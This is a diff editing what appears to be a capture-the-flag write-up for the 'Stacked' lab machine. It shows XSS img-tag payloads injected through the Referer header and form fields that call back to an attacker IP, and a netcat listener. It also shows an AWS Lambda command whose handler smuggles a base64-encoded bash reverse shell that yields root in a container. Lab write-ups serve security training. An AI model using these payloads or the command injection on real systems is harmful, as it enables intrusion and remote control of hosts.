@@ -67,7 +67,7 @@ Referer: <img src="http://10.10.14.3/referer"></img>
 fullname=<img src="http://10.10.14.3/name"></img>&email=test@test.local&tel=123456789012&subject=<img src="http://10.10.14.3/subject"></img>&message=<img src="http://10.10.14.3/message"></img>
 ```
 
-After a while _/referer_ is responds, which means that the _Referer header_ can be used to inject code:
+After a while _/referer_ responds, which means that the _Referer header_ can be used to inject code:
 ```
 nc -lvnp 80
 ```
@@ -240,7 +240,7 @@ Creating and executing Lambda service and replacing _index.handler_ with a rever
 ```
 aws lambda --endpoint=http://s3-testing.stacked.htb/ create-function --function-name 'shell' --zip-file fileb://index.zip --role Anything --handler '$(echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy85MDAxICAwPiYx | base64 -d | bash)' --runtime nodejs10.x
 
-aws lambda --endpoint=http://s3-testing.stacked.htb/ invoke --function-name 'Test2' output
+aws lambda --endpoint=http://s3-testing.stacked.htb/ invoke --function-name 'shell' output
 ```
 
 After executing the Lambda function, the listener on my IP and port 9001 starts a reverse shell as root in the **Docker container**.
